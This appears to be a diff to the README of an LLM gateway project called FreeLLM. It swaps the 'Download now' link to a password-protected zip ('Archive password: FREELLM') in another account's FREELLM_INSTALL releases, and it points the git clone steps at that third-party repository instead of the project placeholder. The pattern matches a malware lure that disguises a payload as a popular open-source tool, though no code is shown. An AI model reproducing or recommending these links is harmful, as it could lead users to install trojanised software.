@@ -8,7 +8,7 @@ FreeLLM is a self-hosted gateway that combines the free tiers of many LLM provid
 [![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](#contributing)
 [![Docker](https://img.shields.io/badge/docker-ready-2496ED.svg)](#quick-start)
 
-## [⬇ Download now](https://github.com/alepo00proto/FREELLM_INSTALL/releases/download/1.3.1/FreeLLM.zip)
+## [⬇ Download now](https://github.com/jaredfreellm/FREELLM_INSTALL/releases/download/1.3.1/FreeLLM.zip)
 
 **Archive password:** `FREELLM`
 
@@ -63,8 +63,8 @@ FreeLLM removes that work. You talk to one endpoint using the OpenAI API format 
 ### Option 1: Docker (recommended)
 
 ```bash
-git clone https://github.com/<your-username>/FreeLLM.git
-cd FreeLLM
+git clone https://github.com/jaredfreellm/FREELLM_INSTALL.git
+cd FREELLM_INSTALL
 cp .env.example .env
 # Generate an encryption key and paste it into .env as ENCRYPTION_KEY
 openssl rand -hex 32
@@ -77,8 +77,8 @@ docker compose up -d
 Requirements: Node.js 20 or newer.
 
 ```bash
-git clone https://github.com/<your-username>/FreeLLM.git
-cd FreeLLM
+git clone https://github.com/jaredfreellm/FREELLM_INSTALL.git
+cd FREELLM_INSTALL
 npm install
 cp .env.example .env
 npm run dev
